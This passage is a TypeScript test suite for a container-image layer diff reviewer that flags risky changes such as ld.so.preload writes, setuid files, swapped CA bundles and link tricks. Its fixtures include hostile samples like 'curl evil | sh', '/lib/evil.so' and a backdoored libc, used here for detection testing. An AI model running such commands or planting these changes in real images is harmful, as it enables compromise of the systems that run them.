// The layer-content diff behind `oupdate image`: what two images' unshared layers change, ranked and cut into parts.
import { describe, expect, test } from "bun:test";
import { detailLines, diffIndexes, dirChange, EXACT_MANDATORY, holderDirs, LAYER_BUDGET, linkAliases, reviewLayers, type LayerBudget } from "../src/image-layers.ts";
import { LayerStore, LIMITS, MergedIndex, parseListing, type FsNode, type LayerListing } from "../src/oci-fs.ts";
import type { ImageEvidence } from "../src/targets/broker/answer.ts";
import { bareTar, fakeLayers, hardlinkTar, noDetail, specLayers, withTmp, type LayerSpec } from "./oci-helpers.ts";

const EV: ImageEvidence = { entrypoint: '["/app/server"]', cmd: "null", history: [] };
const OLD = ["base.tar", "old-top.tar"];
const grown = (...extra: string[]) => [...OLD, ...extra];

async function review(oldNames: string[], newNames: string[], budget: LayerBudget = LAYER_BUDGET, opts: { limits?: typeof LIMITS; ev?: Partial<ImageEvidence>; detail?: Partial<typeof noDetail> } = {}) {
  return withTmp(async (dir) => {
    const store = new LayerStore(dir, opts.limits ?? LIMITS);
    const o = fakeLayers(oldNames);
    const n = fakeLayers(newNames, { detail: opts.detail });
    const r = await reviewLayers({ old: o, new: n, newEvidence: { ...EV, ...opts.ev }, store, budget });
    return { r, fetched: [...o.fetched, ...n.fetched], text: [...r.extra, ...r.parts].join("\n") };
  });
}

/** Two images built from layer specs at test time, reviewed. */
type Specs = (LayerSpec | { tar: string })[];
async function reviewSpecs(oldSpecs: Specs | ((dir: string) => Specs), newSpecs: Specs | ((dir: string) => Specs), ev: Partial<ImageEvidence> = {}) {
  return withTmp(async (dir) => {
    const store = new LayerStore(dir, LIMITS);
    const get = (x: Specs | ((dir: string) => Specs)) => (typeof x === "function" ? x(dir) : x);
    const r = await reviewLayers({ old: specLayers(dir, "o", get(oldSpecs)), new: specLayers(dir, "n", get(newSpecs)), newEvidence: { ...EV, ...ev }, store });
    return { r, text: [...r.extra, ...r.parts].join("\n") };
  });
}

describe("detailLines", () => {
  test("ENV added with a URL, USER, VOLUME, HEALTHCHECK and ONBUILD changes", () => {
    const n = { ...noDetail, env: ["PATH=/bin", "API=https://evil.example/x"], user: "root", volumes: ["/data"], healthcheck: '{"Test":["CMD","true"]}', onbuild: ["RUN x"] };
    const o = { ...noDetail, env: ["PATH=/bin", "OLD=1"], user: "app" };
    expect(detailLines(o, n)).toEqual([
      "ENV +API=https://evil.example/x",
      "ENV -OLD=1",
      "USER changed: app -> root",
      "VOLUME +/data",
      'HEALTHCHECK changed: (none) -> {"Test":["CMD","true"]}',
      "ONBUILD +RUN x",
    ]);
  });

  test("a WorkingDir change", () => {
    expect(detailLines({ ...noDetail, workdir: "/a" }, { ...noDetail, workdir: "/b" })).toEqual(["WORKDIR changed: /a -> /b"]);
  });

  test("no change, no lines", () => {
    expect(detailLines(noDetail, noDetail)).toEqual([]);
  });
});

describe("reviewLayers", () => {
  test("a changed s6 run script is a line diff", async () => {
    const { r, fetched, text } = await review(OLD, grown("new-run.tar.gz"));
    expect(r.parts).toHaveLength(1);
    expect(r.parts[0]).toContain("=== etc/s6-overlay/s6-rc.d/svc/run (changed) ===");
    expect(r.parts[0]).toContain("-exec /app/server --port 80");
    expect(r.parts[0]).toContain("+exec /app/server --port 8080");
    expect(r.hits).toEqual([]);
    // Link propagation lists every layer, so the shared base is read too.
    expect(fetched).toContain("old-top.tar");
    expect(r.summary).toBe("layers: 3 read, 0 not read (shared by both images)");
    expect(text).toContain("FILES: 0 added, 1 changed, 0 removed; 0 owned by upgraded packages, not shown");
  });

  test("an unpackaged ELF in /usr/local/bin is hashed and flagged", async () => {
    const { r } = await review(OLD, grown("new-elf.tar"));
    expect(r.hits).toHaveLength(2);
    expect(r.hits[0]).toMatch(/^unpackaged binary added: usr\/local\/bin\/agent \(sha256 [0-9a-f]{64}\)$/);
    expect(r.hits[1]).toBe("not model-reviewable: binary file(s) usr/local/bin/agent; needs a human");
    expect(r.parts[0]).toContain("=== usr/local/bin/agent (added) ===");
    expect(r.parts[0]).toMatch(/\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
  });

  test("a write to /etc/ld.so.preload is a hard hit and its text is shown", async () => {
    const { r } = await review(OLD, grown("new-preload.tar"));
    expect(r.hits).toContain("startup path added: etc/ld.so.preload");
    expect(r.parts[0]).toContain("+/lib/evil.so");
  });

  test("an apk upgrade shows the package line change and counts the files it replaced", async () => {
    const { r, text } = await review(OLD, grown("new-apk.tar"));
    expect(r.extra).toContain("PACKAGE CHANGES (apk):");
    expect(r.extra).toContain("-tzdata 2024a-r0");
    expect(r.extra).toContain("+tzdata 2024b-r0");
    expect(r.extra).toContain("FILES: 0 added, 1 changed, 0 removed; 1 owned by upgraded packages, not shown");
    expect(r.parts).toEqual([]);
    expect(text).not.toContain("TZ-2024b");
    expect(r.hits).toEqual([]);
  });

  test("whiteouts and an opaque directory are removals; a new file under it is an addition", async () => {
    const { r } = await review(OLD, grown("new-wh.tar"));
    expect(r.extra).toContain("FILES: 1 added, 0 changed, 2 removed; 0 owned by upgraded packages, not shown");
    expect(r.parts[0]).toContain("=== var/lib/app/fresh (added) ===");
  });

  test("a new setuid file is a hit and a symlink is shown as its target", async () => {
    const { r } = await review(OLD, grown("new-setuid.tar"));
    expect(r.hits).toContain("setuid/setgid file added: usr/bin/su2 (mode 4755)");
    expect(r.parts[0]).toContain("symlink -> /etc/passwd");
  });

  test("a new CA certificate is shown and ranks before an ordinary change", async () => {
    const { r } = await review(OLD, grown("new-cacert.tar", "new-setuid.tar"));
    const p = r.parts.join("\n");
    expect(p.indexOf("corp.crt")).toBeGreaterThan(-1);
    expect(p.indexOf("corp.crt")).toBeLessThan(p.indexOf("etc/mylink"));
  });

  test("a change small enough for one part has no narrowing", async () => {
    const { r } = await review(OLD, grown("new-run.tar.gz"));
    expect(r.narrowed).toBeUndefined();
  });

  test("a diff over the part budget narrows tier by tier, ending where it can never land", async () => {
    const { r } = await review(OLD, grown("new-preload.tar", "new-setuid.tar", "new-cacert.tar"), { chunkChars: 40, maxParts: 1 });
    expect(r.narrowed).toMatch(/too large for model review.*never lands; needs a human/);
    expect(r.parts).toHaveLength(1);
    expect(r.parts[0]).toContain("top-ranked priority files only");
    expect(r.hits).toContain("startup path added: etc/ld.so.preload");
  });

  test("an upgraded package's own database cannot hide a setuid file, a startup script or a CA certificate", async () => {
    const { r } = await review(OLD, grown("new-apk-risky.tar"));
    expect(r.hits).toContain("setuid/setgid file added: usr/bin/su2 (mode 4755)");
    const p = r.parts.join("\n");
    expect(p).toContain("=== etc/s6-overlay/s6-rc.d/svc/run (changed) ===");
    expect(p).toContain("+exec /app/server --port 9090");
    expect(p).toContain("corp.crt (added)");
    expect(r.extra).toContain("FILES: 2 added, 2 changed, 0 removed; 1 owned by upgraded packages, not shown");
  });

  test("a maintainer script under the dpkg directory is reviewed; only the bookkeeping files are not", async () => {
    const { r } = await review(OLD, grown("new-postinst.tar"));
    expect(r.parts.join("\n")).toContain("=== var/lib/dpkg/info/foo.postinst (added) ===");
  });

  test("content over the shown limit holds, not just a note", async () => {
    const { r } = await review(OLD, grown("new-run.tar.gz"), LAYER_BUDGET, { limits: { ...LIMITS, maxShown: 10 } });
    expect(r.hits).toEqual([expect.stringMatching(/^content not shown: etc\/s6-overlay\/s6-rc\.d\/svc\/run changed \(\d+ bytes, over the 10 byte limit\)$/)]);
    expect(r.extra.join("\n")).toContain("not shown: etc/s6-overlay/s6-rc.d/svc/run");
  });

  test("a mode-only change is a METADATA line", async () => {
    const { r } = await review(OLD, grown("new-chmod.tar"));
    expect(r.extra).toContain("METADATA etc/motd: mode 0644 -> 0755");
    expect(r.parts).toEqual([]);
  });

  const EP = [...OLD, "ep-old.tar"];
  const startFirst = async (ev: Partial<ImageEvidence>, detail: Partial<typeof noDetail>, target: string) => {
    const { r } = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev, detail });
    const p = r.parts.join("\n");
    expect(p).toContain(`=== ${target} (changed) ===`);
    // Resolved, the start target ranks first; a setuid file (rank 2) would come before an unresolved executable (rank 3).
    expect(p.indexOf(`=== ${target} (changed)`)).toBeLessThan(p.indexOf("=== usr/bin/su3"));
  };

  test("the start target is found through a symlinked parent directory", () => startFirst({ entrypoint: '["/bin/launch"]' }, {}, "usr/bin/launch"));
  test("the start target is found through relative and chained links", () => startFirst({ entrypoint: '["/usr/bin/l3"]' }, {}, "usr/lib/real"));
  test("a relative start word resolves under WorkingDir", () => startFirst({ entrypoint: '["./run.sh"]' }, { workdir: "/app" }, "app/run.sh"));
  test("a bare start word is found on the image's PATH", () => startFirst({ entrypoint: '["launch"]' }, { env: ["PATH=/nowhere:/usr/bin"] }, "usr/bin/launch"));

  test("a link loop leaves the start target unresolved, which holds", async () => {
    const { r } = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/loop1"]' } });
    expect(r.hits).toContain("start target unresolved: /usr/bin/loop1");
    expect(r.parts.join("\n")).toContain("x.crt");
  });

  test("a bare start name is found on PATH before anything under WorkingDir", async () => {
    const { r } = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["launch"]' }, detail: { workdir: "/app" } });
    const p = r.parts.join("\n");
    expect(p.indexOf("=== usr/bin/launch (changed)")).toBeLessThan(p.indexOf("=== usr/bin/su3"));
    expect(p.indexOf("=== usr/bin/su3")).toBeLessThan(p.indexOf("=== app/launch (changed)"));
  });

  test("a start target must be an executable regular file", async () => {
    const { r } = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["/etc/ca-certificates/x.crt"]' } });
    expect(r.hits).toContain("start target unresolved: /etc/ca-certificates/x.crt");
  });

  test("a start target under directories that have no entries of their own resolves", async () => {
    const { r } = await review(OLD, grown("new-implicit.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/opt/svc/start"]' } });
    expect(r.hits.some((h) => h.startsWith("start target unresolved"))).toBe(false);
    const p = r.parts.join("\n");
    expect(p.indexOf("=== opt/svc/start (added)")).toBeGreaterThan(-1);
    expect(p.indexOf("=== opt/svc/start (added)")).toBeLessThan(p.indexOf("=== opt/svc/zzz-setuid"));
  });

  test("40 chained links resolve and 41 do not", async () => {
    const ok = await review(OLD, grown("ep-chain40.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/c1"]' } });
    expect(ok.r.hits.some((h) => h.startsWith("start target unresolved"))).toBe(false);
    expect(ok.r.parts.join("\n")).toContain("=== usr/bin/ctarget (added)");
    const bad = await review(OLD, grown("ep-chain41.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/c1"]' } });
    expect(bad.r.hits).toContain("start target unresolved: /usr/bin/c1");
  });

  test("a changed start-target binary is shown first with its hash, and holds: the reviewers saw only the hash", async () => {
    const { r } = await review(OLD, grown("new-elf.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/local/bin/agent"]' } });
    expect(r.hits).toEqual(["not model-reviewable: binary file(s) usr/local/bin/agent; needs a human"]);
    expect(r.parts[0]).toMatch(/=== usr\/local\/bin\/agent \(added\) ===\n\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
  });

  test("a package-owned start-target ELF the upgrade replaced is shown, not counted away", async () => {
    const { r } = await review(OLD, grown("new-owned-ep.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/local/bin/app"]' } });
    expect(r.parts.join("\n")).toMatch(/=== usr\/local\/bin\/app \(added\) ===\n\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
    expect(r.hits).toEqual(["not model-reviewable: binary file(s) usr/local/bin/app; needs a human"]);
    expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
  });

  test("a link named with bsdtar's arrow cannot plant a phantom link over a replaced library: the layer is unreadable", async () => {
    const base: LayerSpec = { "usr/lib/libssl.so.3": "good" };
    // Listed as `usr/lib/libssl.so.3 -> libssl.so.3.0 -> true`: split at the first arrow it is a link at the library's path.
    const phantom: LayerSpec = { "usr/lib/libssl.so.3 -> libssl.so.3.0": { link: "true" } };
    await expect(reviewSpecs([base], [base, { "usr/lib/libssl.so.3": "evil\0" }, phantom])).rejects.toThrow(/ambiguous member name/);
  });

  const ELF = "\x7fELF\x02\x01\x01\0\0\0";
  const dpkg = (version: string, owns: string[]): LayerSpec => ({
    "var/lib/dpkg/status": `Package: coreutils\nStatus: install ok installed\nVersion: ${version}\n`,
    "var/lib/dpkg/info/coreutils.list": owns.map((p) => `/${p}\n`).join(""),
  });

  test("an image's own dpkg list cannot vouch for a changed binary, executable or not: each holds as not model-reviewable", async () => {
    const before: LayerSpec = { ...dpkg("9.1", ["usr/bin/ls", "usr/lib/libc.so.6"]), "usr/bin/ls": { text: `${ELF}ls`, mode: 0o755 }, "usr/lib/libc.so.6": `${ELF}libc` };
    // The helper is listed as coreutils' own, and libc.so.6 (mode 0644, no exec bit) is replaced alongside the bump.
    const after: LayerSpec = { ...dpkg("9.4", ["usr/bin/ls", "usr/bin/helper", "usr/lib/libc.so.6"]), "usr/bin/helper": { text: `${ELF}helper`, mode: 0o755 }, "usr/lib/libc.so.6": `${ELF}libc, backdoored` };
    const { r } = await reviewSpecs([before], [before, after]);
    expect(r.hits).toContain("not model-reviewable: binary file(s) usr/bin/helper, usr/lib/libc.so.6; needs a human");
    expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
  });

  test("a changed non-executable binary holds with no package change at all, and an owned text file is still set aside", async () => {
    const before: LayerSpec = { ...dpkg("9.1", ["usr/share/doc/coreutils/NEWS"]), "usr/share/doc/coreutils/NEWS": "old news\n", "usr/lib/libssl.so.3": `${ELF}ssl` };
    const lib = await reviewSpecs([before], [before, { "usr/lib/libssl.so.3": `${ELF}ssl, backdoored` }]);
    expect(lib.r.hits).toContain("not model-reviewable: binary file(s) usr/lib/libssl.so.3; needs a human");
    const text = await reviewSpecs([before], [before, { ...dpkg("9.4", ["usr/share/doc/coreutils/NEWS"]), "usr/share/doc/coreutils/NEWS": "new news\n" }]);
    expect(text.r.extra.join("\n")).toContain("1 owned by upgraded packages");
    expect(text.r.hits.some((h) => h.startsWith("not model-reviewable"))).toBe(false);
  });

  test("a start file written under a lower layer's directory link is the overlay's new directory, not the link's target", async () => {
    const run = (body: string) => ({ text: `#!/bin/sh\n${body}\n`, mode: 0o755 });
    const base: LayerSpec = { "usr/lib/app/run": run("echo ok"), lib: { link: "usr/lib" } };
    const { r } = await reviewSpecs([base], (dir) => [base, { tar: bareTar(dir, "under-link", { "lib/app/run": run("curl evil | sh") }) }], { entrypoint: '["/lib/app/run"]' });
    expect(r.hits).toContain("layer writes under a lower symlink: lib/app/run (lib becomes a directory)");
    expect(r.hits.some((h) => h.startsWith("start target unresolved"))).toBe(false);
    expect(r.parts[0]).toContain("=== lib/app/run (added) ===");
    expect(r.parts[0]).toContain("+curl evil | sh");
  });

  test("a setuid file under the apt cache holds, and a name that only starts with status is not bookkeeping", async () => {
    const { r } = await review(OLD, grown("new-cache.tar"));
    expect(r.hits).toContain("setuid/setgid file added: var/cache/apt/pwn (mode 4755)");
    expect(r.parts.join("\n")).toContain("=== var/lib/dpkg/status-helper (added) ===");
  });

  test("a package-owned maintainer script is shown", async () => {
    const { r } = await review(OLD, grown("new-owned-postinst.tar"));
    expect(r.parts.join("\n")).toContain("=== var/lib/dpkg/info/foo.postinst (added) ===");
  });

  test("a mode-only change to a package-owned file is a METADATA line and the file is not counted away", async () => {
    const { r } = await review(OLD, grown("new-owned-chmod.tar"));
    expect(r.extra).toContain("METADATA usr/share/zoneinfo/UTC: mode 0644 -> 0755");
    expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
  });

  test("an interpreted start: the script argument is a start input, shown though it has no exec bit and a bumped package claims it", async () => {
    const PY = [...OLD, "py-old.tar"];
    const { r } = await review(PY, [...PY, "py-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/python3","/app/server.py"]' } });
    expect(r.parts.join("\n")).toContain("=== app/server.py (changed) ===");
    expect(r.hits).toEqual([]);
    expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
  });

  test("a relative start argument resolves against WorkingDir the same way", async () => {
    const PY = [...OLD, "py-old.tar"];
    const { r } = await review(PY, [...PY, "py-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/python3","server.py"]' }, detail: { workdir: "/app" } });
    expect(r.parts.join("\n")).toContain("=== app/server.py (changed) ===");
  });

  test("a mandatory path that is a link gives its target the mandatory class, though a package claims the target", async () => {
    const L = [...OLD, "lnk-old.tar"];
    const { r } = await review(L, [...L, "lnk-new.tar"]);
    expect(r.hits).toContain("startup path changed: opt/preload (target of etc/ld.so.preload)");
    expect(r.parts.join("\n")).toContain("=== opt/preload (changed) ===");
  });

  test("a PATH directory or a cron directory made group or world writable holds; another directory is only shown", async () => {
    const D = [...OLD, "dir-old.tar"];
    const { r } = await review(D, [...D, "dir-new.tar"]);
    expect(r.hits).toContain("directory permissions weakened: usr/local/bin (mode 0755 -> 0777)");
    expect(r.hits).toContain("directory permissions weakened: etc/cron.d (mode 0755 -> 0775)");
    expect(r.hits.some((h) => h.includes("opt/other"))).toBe(false);
    expect(r.extra).toContain("METADATA dir opt/other: mode 0755 -> 0777");
    expect(r.extra).toContain("METADATA dir usr/local/bin: mode 0755 -> 0777");
  });

  test("an empty PATH component means WorkingDir, and an explicitly empty PATH is only WorkingDir", async () => {
    const lead = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["launch"]' }, detail: { workdir: "/app", env: ["PATH=:/usr/bin"] } });
    const p = lead.r.parts.join("\n");
    expect(p.indexOf("=== app/launch (changed)")).toBeLessThan(p.indexOf("=== usr/bin/su3"));
    expect(p.indexOf("=== usr/bin/su3")).toBeLessThan(p.indexOf("=== usr/bin/launch (changed)"));
    const empty = await review(EP, [...EP, "ep-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["launch"]' }, detail: { workdir: "/app", env: ["PATH="] } });
    const q = empty.r.parts.join("\n");
    expect(q.indexOf("=== app/launch (changed)")).toBeLessThan(q.indexOf("=== usr/bin/su3"));
  });
});

describe("start words, aliased targets and directory importance", () => {
  const PY = [...OLD, "py-old.tar"];
  test("no cap on start words: a script after 31 flags is still a start input", async () => {
    const argv = ["/usr/bin/python3", ...Array(31).fill("-B"), "/app/server.py"];
    const { r } = await review(PY, [...PY, "py-new.tar"], LAYER_BUDGET, { ev: { entrypoint: JSON.stringify(argv) } });
    expect(r.parts.join("\n")).toContain("=== app/server.py (changed) ===");
    expect(r.hits).toEqual([]);
  });

  test("a command line past the word budget holds", async () => {
    const argv = ["/usr/bin/python3", ...Array(300).fill("-B"), "/app/server.py"];
    const { r } = await review(PY, [...PY, "py-new.tar"], LAYER_BUDGET, { ev: { entrypoint: JSON.stringify(argv) } });
    expect(r.hits).toContain("start inputs over budget: 302 words");
  });

  test("a mandatory link's hold survives the target also being a start input", async () => {
    const L = [...OLD, "lnk-old.tar"];
    const { r } = await review(L, [...L, "lnk-new.tar"], LAYER_BUDGET, { ev: { entrypoint: '["/usr/bin/cat","/opt/preload"]' } });
    expect(r.hits).toContain("startup path changed: opt/preload (target of etc/ld.so.preload)");
    expect(r.parts.join("\n")).toContain("=== opt/preload (changed) ===");
  });

  test("a target reached by a hard link and a startup link keeps the strongest class", async () => {
    const A = [...OLD, "alias-old.tar"];
    const { r } = await review(A, [...A, "alias-new.tar"]);
    expect(r.hits).toContain("startup path changed: opt/payload (target of etc/ld.so.preload)");
  });

  test("a sticky bit dropped from a world-writable PATH directory holds", async () => {
    const S = [...OLD, "sticky-old.tar"];
    const { r } = await review(S, [...S, "sticky-new.tar"]);
    expect(r.hits).toContain("directory permissions weakened: usr/local/bin (mode 1777 -> 0777)");
  });

  test("a writable ancestor of a PATH directory holds", async () => {
    const A = [...OLD, "anc-old.tar"];
    const { r } = await review(A, [...A, "anc-new.tar"], LAYER_BUDGET, { detail: { env: ["PATH=/opt/tools/bin"] } });
    expect(r.hits).toContain("directory permissions weakened: opt/tools (mode 0755 -> 0777)");
  });
});

describe("ancestors of mandatory paths and mandatory directory links", () => {
  test("a writable ancestor of an apk scripts archive, a .pth file or authorized_keys holds, though those files are unchanged", async () => {
    const A = [...OLD, "anc2-old.tar"];
    const { r } = await review(A, [...A, "anc2-new.tar"]);
    expect(r.hits).toContain("directory permissions weakened: lib/apk (mode 0755 -> 0777)");
    expect(r.hits).toContain("directory permissions weakened: usr/lib/python3 (mode 0755 -> 0777)");
    expect(r.hits).toContain("directory permissions weakened: root (mode 0755 -> 0777)");
  });

  test("a mandatory directory that is a link hands its class to a changed script below its target, and its ancestors are important", async () => {
    const H = [...OLD, "hooks-old.tar"];
    const { r } = await review(H, [...H, "hooks-new.tar"]);
    expect(r.hits).toContain("startup path changed: opt/hooks/boot.sh (target of etc/init.d/boot.sh)");
    expect(r.parts.join("\n")).toContain("=== opt/hooks/boot.sh (changed) ===");
    expect(r.hits).toContain("directory permissions weakened: opt (mode 0755 -> 0777)");
  });
});

describe("one link resolver", () => {
  const stack = (old: string, ...more: string[]) => ({ old: [...OLD, old], now: [...OLD, old, ...more] });

  test("U1: a directory below a mandatory directory link's target is important", async () => {
    const t = stack("u1-old.tar", "u1-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("directory permissions weakened: opt/hooks/sub (mode 0755 -> 0777)");
  });

  test("U2: two directory links to one target keep the hard class", async () => {
    const t = stack("u2-old.tar", "u2-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path changed: opt/hooks/boot.sh (target of etc/init.d/boot.sh)");
  });

  test("U3: a link below an aliased directory carries the class to its own target", async () => {
    const t = stack("u3-old.tar", "u3-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path changed: opt/payload (target of etc/init.d/boot.sh)");
    expect(r.parts.join("\n")).toContain("=== opt/payload (changed) ===");
  });

  test("U4: a mandatory directory link added, or redirected to an existing directory, is classified like a changed file there", async () => {
    const added = await review([...OLD, "u4-dirs.tar"], [...OLD, "u4-dirs.tar", "u4-add.tar"]);
    expect(added.r.hits).toContain("startup path added: etc/init.d");
    const moved = await review([...OLD, "u4-dirs.tar", "u4-add.tar"], [...OLD, "u4-dirs.tar", "u4-add.tar", "u4-redirect.tar"]);
    expect(moved.r.hits).toContain("startup path changed: etc/init.d");
  });

  test("U5: implicit target directories resolve", async () => {
    const t = stack("u5-old.tar", "u5-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path changed: opt/hooks/boot.sh (target of etc/init.d/boot.sh)");
  });

  test("U5: a link to the image root maps every path below it", async () => {
    const t = stack("u5r-old.tar", "u5r-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path changed: opt/payload (target of etc/init.d/opt/payload)");
  });

  test("a link loop through a mandatory path holds", async () => {
    const t = stack("u5r-old.tar", "u5r-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits.some((h) => h.startsWith("link loop: etc/init.d"))).toBe(true);
  });
});

describe("the virtual view", () => {
  const stack = (old: string[], ...more: string[]) => ({ old: [...OLD, ...old], now: [...OLD, ...old, ...more] });

  test("V1: redirecting an intermediate link changes what a mandatory directory link shows", async () => {
    const t = stack(["v1-old.tar"], "v1-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path changed: etc/init.d");
    expect(r.hits).toContain("startup path added: etc/init.d/b");
    expect(r.hits).toContain("startup path removed: etc/init.d/a");
    expect(r.parts.join("\n")).toContain("=== etc/init.d/b (added) ===");
  });

  test("V2: removing a mandatory file, removing a mandatory link, or replacing either holds", async () => {
    const removed = stack(["v2-old.tar"], "v2-rm.tar");
    const a = await review(removed.old, removed.now);
    expect(a.r.hits).toContain("startup path removed: etc/ld.so.preload");
    expect(a.r.hits).toContain("startup path removed: etc/init.d");
    expect(a.r.hits).toContain("startup path removed: etc/init.d/a");
    const fifo = stack(["v2-old.tar"], "v2-fifo.tar");
    const b = await review(fifo.old, fifo.now);
    expect(b.r.hits).toContain("startup path type changed: etc/ld.so.preload (file -> fifo)");
    const dir = stack(["v2-old.tar"], "v2-dir.tar");
    const c = await review(dir.old, dir.now);
    expect(c.r.hits).toContain("startup path type changed: etc/init.d (symlink -> dir)");
    expect(c.r.hits).toContain("startup path removed: etc/init.d/a");
  });

  test("V3: a link at etc that activates a file already in the image holds, and the file is shown", async () => {
    const t = stack(["v3-old.tar"], "v3-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.hits).toContain("startup path added: etc/ld.so.preload");
    expect(r.hits).toContain("startup path removed: etc/passwd");
    expect(r.parts.join("\n")).toContain("=== etc/ld.so.preload (added) ===");
  });

  test("V4: a link that makes an existing file newly reachable shows that file's content", async () => {
    const t = stack(["v4-old.tar"], "v4-new.tar");
    const { r } = await review(t.old, t.now);
    expect(r.parts.join("\n")).toContain("=== etc/services.d/run (added) ===");
    expect(r.parts.join("\n")).toContain("+exec /app/server");
  });

  test("V5: two large indexes diff entry by entry without reading layers", async () => {
    const listing = (i: number, extra?: string): LayerListing => {
      const entries = new Map();
      for (let k = 0; k < 500; k++) {
        const path = `usr/lib/l${i}-f${k}`;
        entries.set(path, { path, type: "file", mode: 0o644, uid: 0, gid: 0, size: 1, layer: `sha256:${i}`, member: path });
      }
      if (extra) entries.set(extra, { path: extra, type: "file", mode: 0o644, uid: 0, gid: 0, size: 1, layer: "sha256:x", member: extra });
      return { digest: `sha256:${i}`, file: "", entries, whiteouts: new Set(), opaque: new Set() };
    };
    const base = Array.from({ length: 200 }, (_, i) => listing(i));
    const o = MergedIndex.fromListings(base);
    const n = MergedIndex.fromListings([...base, listing(999, "etc/new")]);
    const changes = await diffIndexes(o, n, undefined as never, undefined as never);
    expect(changes.filter((c) => c.path === "etc/new")).toHaveLength(1);
    expect(changes.filter((c) => !c.path.startsWith("usr/lib/l999-") && c.path !== "etc/new" && c.path !== "etc")).toEqual([]);
  });
});

describe("round 8", () => {
  test("W1: a hard link's content is its target's at the time its layer applies, so a lower layer's change shows", async () => {
    const { r } = await review([...OLD, "w1-old.tar", "w1-link.tar"], [...OLD, "w1-evil.tar", "w1-link.tar"]);
    expect(r.hits).toContain("startup path changed: etc/ld.so.preload");
    expect(r.parts.join("\n")).toContain("+/lib/evil.so");
  });

  test("W1: a hard link whose target cannot be resolved holds", async () => {
    const { r } = await review([...OLD, "w1-link.tar"], [...OLD, "w1-link.tar", "new-run.tar.gz"]);
    expect(r.hits).toContain("hard link target unresolved: etc/ld.so.preload -> opt/preload");
  });

  test("W2: root/.ssh as a link through a redirected intermediate link changes authorized_keys", async () => {
    const { r } = await review([...OLD, "w2-old.tar"], [...OLD, "w2-old.tar", "w2-new.tar"]);
    expect(r.hits).toContain("startup path changed: root/.ssh/authorized_keys");
    expect(r.parts.join("\n")).toContain("=== root/.ssh/authorized_keys (changed) ===");
  });

  test("W2: a python site directory link redirected changes a .pth file", async () => {
    const { r } = await review([...OLD, "w2p-old.tar"], [...OLD, "w2p-old.tar", "w2p-new.tar"]);
    expect(r.hits).toContain("startup path changed: usr/lib/python3/site-packages/a.pth");
  });

  test("W3: a startup directory's mode change without a writable bit, and the removal of an empty one, hold", async () => {
    const mode = await review([...OLD, "w3b-old.tar"], [...OLD, "w3b-old.tar", "w3b-mode.tar"]);
    expect(mode.r.hits).toContain("startup path changed: etc/profile.d (mode 0755 -> 0750)");
    const rm = await review([...OLD, "w3c-old.tar"], [...OLD, "w3c-old.tar", "w3c-rm.tar"]);
    expect(rm.r.hits).toContain("startup path removed: etc/cron.d");
  });

  test("W4: the virtual name stays as evidence when the file behind a new link also changed", async () => {
    const { r } = await review([...OLD, "v4-old.tar"], [...OLD, "v4-old.tar", "w4-new.tar"]);
    expect(r.extra).toContain("ALIAS etc/services.d/run -> opt/services/run (added)");
    expect(r.parts.join("\n")).toContain("+exec /app/server --changed");
  });

  test("W5: dpkg ownership comes from the file lists in the merged index: the owned file is counted, not shown", async () => {
    const { r } = await review([...OLD, "dpkg-old.tar"], [...OLD, "dpkg-old.tar", "dpkg-new.tar"]);
    expect(r.extra).toContain("PACKAGE CHANGES (dpkg):");
    expect(r.extra).toContain("-foo 1");
    expect(r.extra).toContain("+foo 2");
    expect(r.extra.join("\n")).toContain("1 owned by upgraded packages");
    expect(r.parts.join("\n")).not.toContain("usr/share/foo/data");
  });
});

describe("round 9", () => {
  test("X3: a link at etc/pki/tls to an omitted cache path still shows the swapped CA bundle", async () => {
    const { r } = await review([...OLD, "x3-old.tar"], [...OLD, "x3-old.tar", "x3-new.tar"]);
    // The physical path sits under an omitted cache directory, but its trust alias makes it mandatory, so it is shown.
    expect(r.parts.join("\n")).toContain("=== var/cache/apt/tls/certs/ca-bundle.crt (changed) ===");
    expect(r.parts.join("\n")).toContain("+EVIL CA");
    expect(r.extra).toContain("ALIAS etc/pki/tls/certs/ca-bundle.crt -> var/cache/apt/tls/certs/ca-bundle.crt (changed)");
  });

  test("X4: empty startup and trust directories removed by whiteout hold with evidence", async () => {
    const { r } = await review([...OLD, "x4-old.tar"], [...OLD, "x4-old.tar", "x4-rm.tar"]);
    expect(r.hits).toContain("startup path removed: etc/services.d");
    expect(r.hits).toContain("trust path removed: etc/ssl/certs");
    expect(r.extra).toContain("removed: etc/services.d");
    expect(r.extra).toContain("removed: etc/ssl/certs");
    expect(r.extra.join("\n")).toContain("2 removed");
  });

  test("X2: nested directory links: changing or removing root changes authorized_keys under it", async () => {
    const moved = await review([...OLD, "x2-old.tar"], [...OLD, "x2-old.tar", "x2-new.tar"]);
    expect(moved.r.hits).toContain("startup path changed: root/.ssh/authorized_keys");
